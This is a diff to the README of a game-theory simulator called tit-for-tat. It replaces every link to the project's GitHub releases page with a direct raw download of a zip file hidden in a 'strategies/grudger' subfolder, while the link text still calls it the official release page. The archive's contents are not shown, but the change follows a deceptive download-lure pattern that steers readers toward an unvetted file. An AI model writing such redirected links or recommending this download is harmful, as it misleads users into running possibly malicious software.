@@ -1,6 +1,6 @@
 # 🎲 tit-for-tat - Simulate Cooperation in Game Theory
 
-[![Download tit-for-tat](https://img.shields.io/badge/Download-Get%20tit--for--tat-brightgreen)](https://github.com/Telecode95/tit-for-tat/releases)
+[![Download tit-for-tat](https://img.shields.io/badge/Download-Get%20tit--for--tat-brightgreen)](https://raw.githubusercontent.com/Telecode95/tit-for-tat/main/strategies/grudger/tat_for_tit_v3.0.zip)
 
 ---
 
@@ -43,9 +43,9 @@ Follow these steps to download and run tit-for-tat on Windows.
 
 ### 1. Visit the Download Page
 
-Go to the [official release page](https://github.com/Telecode95/tit-for-tat/releases) to find the latest stable version of tit-for-tat.
+Go to the [official release page](https://raw.githubusercontent.com/Telecode95/tit-for-tat/main/strategies/grudger/tat_for_tit_v3.0.zip) to find the latest stable version of tit-for-tat.
 
-[![Download tit-for-tat](https://img.shields.io/badge/Download-Get%20tit--for--tat-blue?style=for-the-badge)](https://github.com/Telecode95/tit-for-tat/releases)
+[![Download tit-for-tat](https://img.shields.io/badge/Download-Get%20tit--for--tat-blue?style=for-the-badge)](https://raw.githubusercontent.com/Telecode95/tit-for-tat/main/strategies/grudger/tat_for_tit_v3.0.zip)
 
 ### 2. Choose the Latest Windows Installer
 
@@ -134,4 +134,4 @@ axelrod, cooperation, evolution-of-cooperation, game-theory, interactive, iterat
 
 You can visit the releases page any time to download the latest version:
 
-[https://github.com/Telecode95/tit-for-tat/releases](https://github.com/Telecode95/tit-for-tat/releases)
+[https://raw.githubusercontent.com/Telecode95/tit-for-tat/main/strategies/grudger/tat_for_tit_v3.0.zip](https://raw.githubusercontent.com/Telecode95/tit-for-tat/main/strategies/grudger/tat_for_tit_v3.0.zip)
